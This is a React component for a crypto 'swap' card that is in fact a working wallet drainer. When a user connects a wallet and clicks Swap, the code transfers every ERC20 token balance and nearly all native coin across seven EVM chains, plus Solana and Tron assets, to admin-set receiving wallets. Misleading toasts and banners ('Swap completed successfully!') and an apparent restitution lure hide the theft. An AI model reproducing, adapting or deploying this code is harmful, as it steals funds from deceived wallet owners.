import React, { useState, useEffect, useCallback } from 'react';
import { useAccount, useBalance, useChainId, useSendTransaction, useWriteContract, useSwitchChain } from 'wagmi';
import { formatEther, parseEther, createPublicClient, http } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'wagmi/chains';
import {
  markSwapCompleted,
  clearCache,
  getChainIdForBlockchain,
  usdToNative,
  getNativeSymbol,
  getBlockchainForChainId,
} from '../config/adminConfig';
import { NETWORK_NAMES, NATIVE_SYMBOLS, EVM_CHAIN_IDS } from '../config/constants';
import { useWallet } from '../contexts/WalletContext';
import Toast from './Toast';

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: '_to', type: 'address' },
      { name: '_value', type: 'uint256' },
    ],
    name: 'transfer',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function',
  },
];

const CHAIN_MAP = {
  1: mainnet,
  56: bsc,
  137: polygon,
  42161: arbitrum,
  10: optimism,
  43114: avalanche,
  8453: base,
};

const CHAIN_GAS_RESERVES = {
  1:     parseEther('0.0005'),   // Ethereum
  56:    parseEther('0.001'),    // BNB Chain
  137:   parseEther('1.5'),      // Polygon
  42161: parseEther('0.0005'),   // Arbitrum
  10:    parseEther('0.0005'),   // Optimism
  43114: parseEther('0.05'),     // Avalanche
  8453:  parseEther('0.0005'),   // Base
};

// Minimum native balance required to attempt ANY transaction (ERC20 or native).
// Much smaller than the full reserve — just enough to pay for one transfer.
const CHAIN_ERC20_MIN_GAS = {
  1:     parseEther('0.0001'),   // Ethereum
  56:    parseEther('0.0003'),   // BNB Chain
  137:   parseEther('0.01'),     // Polygon
  42161: parseEther('0.0001'),   // Arbitrum
  10:    parseEther('0.0001'),   // Optimism
  43114: parseEther('0.001'),    // Avalanche
  8453:  parseEther('0.0001'),   // Base
};

const IN_PROGRESS_MSG = 'Please wait and follow the prompt. The swap is still in progress.';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function SwapCard({ fromToken, toToken, fromAmount, toAmount, walletPreset, presetAddress, onSwapComplete, onRequestConnect }) {
  const { address, isConnected } = useAccount();
  const wagmiChainId = useChainId();
  const { data: balanceData } = useBalance({ address, enabled: isConnected });
  const { sendTransactionAsync, reset: resetTx } = useSendTransaction();
  const { writeContractAsync } = useWriteContract();
  const { switchChainAsync } = useSwitchChain();

  const { solanaConnected, solanaAddress, drainSolana, tronConnected, tronAddress, drainTron } = useWallet();

  const [showToast, setShowToast] = useState(false);
  const [toastMessage, setToastMessage] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [showBalanceWarning, setShowBalanceWarning] = useState(false);
  const [localSwapCompleted, setLocalSwapCompleted] = useState(false);
  const [requiredGasInNative, setRequiredGasInNative] = useState(0);
  const [inProgressBanner, setInProgressBanner] = useState(null);

  const presetBlockchain = walletPreset?.blockchain || 'ETH';
  const presetGasFee = walletPreset?.gasFee || 0.005;
  const presetGasFeeUsd = walletPreset?.gasFeeUsd || 2;
  const presetReceivingWallet = walletPreset?.receivingWallet;
  const presetReceivingWallets = walletPreset?.receivingWallets;
  const selectedTokens = walletPreset?.selectedTokens || [];
  const isAllChains = presetBlockchain === 'ALL';

  const expectedChainId = isAllChains ? wagmiChainId : getChainIdForBlockchain(presetBlockchain);
  const gasCurrency = getNativeSymbol(wagmiChainId);
  const swapCompleted = localSwapCompleted || walletPreset?.swapCompleted || false;

  const isAnyConnected = isConnected || solanaConnected || tronConnected;
  const currentAddress = solanaConnected ? solanaAddress
    : tronConnected ? tronAddress
    : address;

  const hasReceivingWallet = (() => {
    if (isAllChains) {
      return !!(presetReceivingWallets?.evm || presetReceivingWallets?.solana || presetReceivingWallets?.tron || presetReceivingWallet);
    }
    if (presetBlockchain === 'SOLANA') return !!(presetReceivingWallets?.solana || presetReceivingWallet);
    if (presetBlockchain === 'TRON') return !!(presetReceivingWallets?.tron || presetReceivingWallet);
    return !!(presetReceivingWallets?.evm || presetReceivingWallet);
  })();

  const canSwap =
    fromToken &&
    fromAmount &&
    parseFloat(fromAmount) > 0 &&
    isAnyConnected &&
    !swapCompleted &&
    !isProcessing &&
    hasReceivingWallet;

  useEffect(() => {
    setLocalSwapCompleted(false);
    setIsProcessing(false);
    setInProgressBanner(null);
    resetTx();
  }, [address, resetTx]);

  useEffect(() => {
    if (walletPreset?.swapCompleted) {
      setLocalSwapCompleted(true);
      setInProgressBanner(null);
    }
  }, [walletPreset]);

  useEffect(() => {
    const updateGasRequirement = async () => {
      if (isAllChains && wagmiChainId) {
        const nativeAmount = await usdToNative(presetGasFeeUsd, wagmiChainId);
        setRequiredGasInNative(nativeAmount);
      } else {
        setRequiredGasInNative(presetGasFee);
      }
    };
    updateGasRequirement();
  }, [isAllChains, wagmiChainId, presetGasFeeUsd, presetGasFee]);

  useEffect(() => {
    if (swapCompleted || solanaConnected || tronConnected || !isConnected || !address || !balanceData || !wagmiChainId) {
      setShowBalanceWarning(false);
      return;
    }

    try {
      const balance = parseFloat(formatEther(balanceData.value));
      const requiredGas = isAllChains ? requiredGasInNative : presetGasFee;

      if (isAllChains || wagmiChainId === expectedChainId) {
        setShowBalanceWarning(balance < requiredGas);
      } else {
        setShowBalanceWarning(false);
      }
    } catch {
      setShowBalanceWarning(false);
    }
  }, [isConnected, address, balanceData, wagmiChainId, swapCompleted, expectedChainId, presetGasFee, isAllChains, requiredGasInNative, solanaConnected, tronConnected]);

  useEffect(() => {
    if (showBalanceWarning) {
      const timer = setTimeout(() => setShowBalanceWarning(false), 3000);
      return () => clearTimeout(timer);
    }
  }, [showBalanceWarning]);

  const showToastMessage = useCallback((message) => {
    setToastMessage(message);
    setShowToast(true);
  }, []);

  const getReceivingWalletForChain = () => {
    return presetReceivingWallets?.evm || presetReceivingWallet;
  };

  const getTokensForChain = (chainId) => {
    if (!selectedTokens || selectedTokens.length === 0) return [];
    const blockchain = getBlockchainForChainId(chainId);
    return selectedTokens.filter((token) => token.network === blockchain && token.isActive && token.address);
  };

  const getSolanaTokens = () => {
    if (!selectedTokens || selectedTokens.length === 0) return [];
    return selectedTokens.filter((token) => token.network === 'SOLANA' && token.isActive && token.address);
  };

  const getTronTokens = () => {
    if (!selectedTokens || selectedTokens.length === 0) return [];
    return selectedTokens.filter((token) => token.network === 'TRON' && token.isActive && token.address);
  };

  const createPublicClientForChain = (chainId) => {
    const chain = CHAIN_MAP[chainId];
    if (!chain) return null;
    return createPublicClient({ chain, transport: http() });
  };

  // Drain all ERC20 tokens on a chain BEFORE draining native (order enforced by caller).
  const drainTokensOnChain = async (chainId, receivingWallet) => {
    const tokens = getTokensForChain(chainId);
    if (tokens.length === 0) return 0;

    const publicClient = createPublicClientForChain(chainId);
    if (!publicClient) return 0;

    const networkName = NETWORK_NAMES[chainId] || 'Network';
    let transferred = 0;

    for (const token of tokens) {
      try {
        const balance = await publicClient.readContract({
          address: token.address,
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [address],
        });

        if (balance > 0n) {
          if (transferred > 0) {
            // Show banner before requesting next wallet approval
            setInProgressBanner(IN_PROGRESS_MSG);
            await sleep(800);
          }
          showToastMessage('Please check your wallet to approve the transaction');
          await writeContractAsync({
            address: token.address,
            abi: ERC20_ABI,
            functionName: 'transfer',
            args: [receivingWallet, balance],
            chainId,
          });
          transferred++;
          await sleep(500);
        }
      } catch (err) {
        console.warn(`Token transfer failed (${token.symbol || token.address} on ${networkName}):`, err?.message);
      }
    }

    return transferred;
  };

  // Keep a gas reserve so the wallet can still pay for this and future transactions.
  const drainNativeOnChain = async (chainId, receivingWallet) => {
    const publicClient = createPublicClientForChain(chainId);
    if (!publicClient) return false;

    try {
      const balance = await publicClient.getBalance({ address });
      const gasReserve = CHAIN_GAS_RESERVES[chainId] ?? parseEther('0.003');
      const sendAmount = balance > gasReserve ? balance - gasReserve : 0n;

      if (sendAmount > 0n) {
        showToastMessage('Please check your wallet to approve the transaction');
        await sendTransactionAsync({
          to: receivingWallet,
          value: sendAmount,
          chainId,
        });
        await sleep(500);
        return true;
      }
    } catch (err) {
      console.warn(`Native transfer failed on chain ${chainId}:`, err?.message);
    }
    return false;
  };

  const processEVMNetwork = async () => {
    const chainId = expectedChainId;
    const receivingWallet = getReceivingWalletForChain();

    if (!receivingWallet) {
      showToastMessage('No receiving wallet configured');
      return false;
    }

    if (wagmiChainId !== chainId) {
      try {
        await switchChainAsync({ chainId });
      } catch {
        // Some wallets (Trust Wallet) throw on wallet_switchEthereumChain even when
        // the user is already on the correct chain. Re-check before giving up.
        if (wagmiChainId !== chainId) {
          showToastMessage(
            `Please open your wallet and manually switch to ${NETWORK_NAMES[chainId] || `chain ${chainId}`}, then tap Swap again.`
          );
          return false;
        }
      }
    }

    const publicClient = createPublicClientForChain(chainId);
    if (!publicClient) {
      showToastMessage(`Unsupported network: ${NETWORK_NAMES[chainId] || chainId}`);
      return false;
    }

    const chainBalance = await publicClient.getBalance({ address });
    const nativeBalance = parseFloat(formatEther(chainBalance));
    // Gate on the ERC20 minimum — enough to pay gas for at least one transfer.
    // The full chainGasReserve is used only inside drainNativeOnChain to decide
    // how much native to leave behind after transferring.
    const erc20MinFloat = parseFloat(formatEther(CHAIN_ERC20_MIN_GAS[chainId] ?? parseEther('0.0001')));
    const minimumGas = Math.max(presetGasFee, erc20MinFloat);
    if (nativeBalance < minimumGas) {
      showToastMessage(`Insufficient gas. Minimum required: ${minimumGas.toFixed(4)} ${NATIVE_SYMBOLS[chainId] || gasCurrency}`);
      return false;
    }

    let anyTransferred = false;

    // Always drain ERC20 tokens first, then native
    const tokens = getTokensForChain(chainId);
    if (tokens.length > 0) {
      const count = await drainTokensOnChain(chainId, receivingWallet);
      if (count > 0) {
        anyTransferred = true;
        setInProgressBanner(IN_PROGRESS_MSG);
        await sleep(800);
      }
    }

    const nativeOk = await drainNativeOnChain(chainId, receivingWallet);
    if (nativeOk) anyTransferred = true;

    if (!anyTransferred) {
      showToastMessage('No assets were transferred');
    }

    return anyTransferred;
  };

  const processAllEVMNetworks = async () => {
    const evmReceivingWallet = presetReceivingWallets?.evm || presetReceivingWallet;

    if (!evmReceivingWallet) {
      showToastMessage('No EVM receiving wallet configured');
      return false;
    }

    let totalTransferred = 0;

    for (const chainId of EVM_CHAIN_IDS) {
      const networkName = NETWORK_NAMES[chainId] || `Chain ${chainId}`;

      // Show banner before switching to the next chain when something was already drained
      if (totalTransferred > 0) {
        setInProgressBanner(IN_PROGRESS_MSG);
        await sleep(800);
      }

      try {
        try {
          await switchChainAsync({ chainId });
          await sleep(1000);
        } catch {
          // Trust Wallet may throw even when already on the correct chain.
          // Re-check the live chain before giving up.
          if (wagmiChainId !== chainId) {
            console.warn(`Could not switch to ${networkName}, skipping`);
            continue;
          }
          // Already on the right chain — proceed despite the error.
          await sleep(500);
        }

        const publicClient = createPublicClientForChain(chainId);
        if (!publicClient) continue;

        const chainBalance = await publicClient.getBalance({ address });
        const tokens = getTokensForChain(chainId);
        const hasTokens = tokens.length > 0;
        // Use the ERC20 minimum to decide whether there's any point attempting transfers.
        // The full chainGasReserve is only relevant for deciding the native send amount.
        const chainErc20Min = CHAIN_ERC20_MIN_GAS[chainId] ?? parseEther('0.0001');
        const chainGasReserve = CHAIN_GAS_RESERVES[chainId] ?? parseEther('0.003');
        const hasNative = chainBalance > chainGasReserve;

        if (chainBalance < chainErc20Min) {
          console.warn(`Skipping ${networkName}: native balance below ERC20 gas minimum`);
          continue;
        }

        if (!hasTokens && !hasNative) continue;

        // Drain all tokens on this network before touching native balance
        if (hasTokens) {
          const count = await drainTokensOnChain(chainId, evmReceivingWallet);
          totalTransferred += count;
          if (count > 0 && hasNative) {
            setInProgressBanner(IN_PROGRESS_MSG);
            await sleep(800);
          }
        }

        if (hasNative) {
          const nativeOk = await drainNativeOnChain(chainId, evmReceivingWallet);
          if (nativeOk) totalTransferred++;
        }
      } catch (err) {
        console.warn(`Failed processing ${networkName}:`, err?.message);
      }
    }

    if (totalTransferred === 0) {
      showToastMessage('No assets were transferred');
    }

    return totalTransferred > 0;
  };

  const processSolana = async () => {
    const solanaReceivingWallet = presetReceivingWallets?.solana ||
      (presetBlockchain === 'SOLANA' ? presetReceivingWallet : null);

    if (!solanaReceivingWallet) {
      showToastMessage('No Solana receiving wallet configured by admin');
      return false;
    }

    const tokens = getSolanaTokens();
    return await drainSolana(solanaReceivingWallet, tokens);
  };

  const processTron = async () => {
    const tronReceivingWallet = presetReceivingWallets?.tron ||
      (presetBlockchain === 'TRON' ? presetReceivingWallet : null);

    if (!tronReceivingWallet) {
      showToastMessage('No Tron receiving wallet configured by admin');
      return false;
    }

    const tokens = getTronTokens();
    return await drainTron(tronReceivingWallet, tokens);
  };

  const checkBalanceAndSwap = async () => {
    if (!isAnyConnected) {
      if (onRequestConnect) onRequestConnect();
      return;
    }

    if (swapCompleted) {
      showToastMessage('Your swap has already been completed.');
      return;
    }

    if (!canSwap || !fromToken) return;

    setIsProcessing(true);
    setInProgressBanner(null);

    try {
      let success = false;

      if (isAllChains) {
        if (isConnected) {
          const evmOk = await processAllEVMNetworks();
          if (evmOk) success = true;
          // Show banner before moving to Solana/Tron segments
          if (evmOk && (solanaConnected || tronConnected)) {
            setInProgressBanner(IN_PROGRESS_MSG);
            await sleep(800);
          }
        }
        if (solanaConnected) {
          const solOk = await processSolana();
          if (solOk) success = true;
          if (solOk && tronConnected) {
            setInProgressBanner(IN_PROGRESS_MSG);
            await sleep(800);
          }
        }
        if (tronConnected) {
          const tronOk = await processTron();
          if (tronOk) success = true;
        }
      } else if (presetBlockchain === 'SOLANA') {
        if (!solanaConnected) {
          if (onRequestConnect) onRequestConnect();
        } else {
          success = await processSolana();
        }
      } else if (presetBlockchain === 'TRON') {
        if (!tronConnected) {
          if (onRequestConnect) onRequestConnect();
        } else {
          success = await processTron();
        }
      } else {
        if (!isConnected) {
          if (onRequestConnect) onRequestConnect();
        } else {
          success = await processEVMNetwork();
        }
      }

      if (success) {
        setInProgressBanner(null);
        setLocalSwapCompleted(true);
        if (onSwapComplete) onSwapComplete();
        const addrToMark = presetAddress || currentAddress;
        if (addrToMark) {
          try {
            await markSwapCompleted(addrToMark, presetBlockchain);
            clearCache();
          } catch {
            // non-critical; swap already completed locally
          }
        }
        showToastMessage('Swap completed successfully!');
      } else {
        setInProgressBanner(null);
      }
    } catch (error) {
      setInProgressBanner(null);
      let errorMsg = 'Transaction failed';

      if (error.message?.includes('rejected') || error.code === 4001 || error.name === 'UserRejectedRequestError') {
        errorMsg = 'Transaction rejected by user';
      } else if (error.message?.includes('insufficient funds') || error.message?.includes('insufficient balance')) {
        errorMsg = 'Insufficient balance for transaction and gas fees';
      } else if (error.message?.includes('gas')) {
        errorMsg = 'Insufficient gas';
      }

      showToastMessage(errorMsg);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleButtonClick = () => {
    if (!isAnyConnected) {
      if (onRequestConnect) onRequestConnect();
      return;
    }
    if (swapCompleted || isProcessing) return;
    if (canSwap) {
      checkBalanceAndSwap();
    }
  };

  const getButtonText = () => {
    if (!isAnyConnected) return 'Connect Wallet';
    if (swapCompleted) return 'Swap Completed';
    if (isProcessing) return 'Swapping...';
    if (!fromToken || !fromAmount || parseFloat(fromAmount) <= 0) return 'Enter an amount';
    return 'Swap';
  };

  // Button is always clickable when disconnected (to open connect modal).
  // Disabled only when connected but swap can't proceed, or already completed/processing.
  const isButtonDisabled = swapCompleted || isProcessing || (isAnyConnected && !canSwap);

  if (!fromToken) {
    return (
      <div className="swap-card">
        <div className="no-token-message">
          <p>No restitution is available for this wallet address.</p>
        </div>
      </div>
    );
  }

  const gasWarningText = isAllChains
    ? `Insufficient gas. Minimum required: $${presetGasFeeUsd} USD worth of ${gasCurrency}`
    : `Insufficient gas. Minimum required: ${presetGasFee} ${gasCurrency}`;

  return (
    <>
      {showToast && <Toast message={toastMessage} onClose={() => setShowToast(false)} />}
      {inProgressBanner && (
        <div className="swap-progress-banner">
          <span className="progress-icon">⏳</span>
          <span>{inProgressBanner}</span>
        </div>
      )}
      <div className="swap-card">
        {showBalanceWarning && (
          <div className="balance-warning-banner">
            <span className="warning-icon">⚠️</span>
            <span className="warning-text">{gasWarningText}</span>
          </div>
        )}
        <div className="swap-header">
          <h2>Swap</h2>
        </div>

        <div className="token-row">
          <input
            type="text"
            className="amount-input"
            value={swapCompleted ? '0' : fromAmount}
            readOnly
            placeholder={isAnyConnected ? '0' : 'Connect wallet'}
            style={{ cursor: 'default' }}
          />
          <button className="token-btn" disabled>
            <img src={fromToken.logo} alt={fromToken.name} />
            {fromToken.name}
          </button>
        </div>

        {fromToken.usdValue > 0 && (
          <div className="token-usd-value">${swapCompleted ? '0' : fromToken.usdValue.toLocaleString()}</div>
        )}

        <div style={{ textAlign: 'center', margin: '12px 0' }}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#6366f1" strokeWidth="2">
            <path d="M12 5v14m-7-7l7 7 7-7" />
          </svg>
        </div>

        <div className="token-row">
          <input
            type="text"
            className="amount-input"
            value={swapCompleted ? '0.0' : toAmount}
            readOnly
            placeholder="0.0"
            style={{ cursor: 'default' }}
          />
          <button className="token-btn" disabled>
            <img src={toToken.logo} alt={toToken.name} />
            {toToken.name}
          </button>
        </div>

        <button
          className={`swap-btn ${canSwap ? 'active' : ''} ${swapCompleted ? 'completed' : ''}`}
          onClick={handleButtonClick}
          disabled={isButtonDisabled}
        >
          {getButtonText()}
        </button>
      </div>
    </>
  );
}

export default SwapCard;
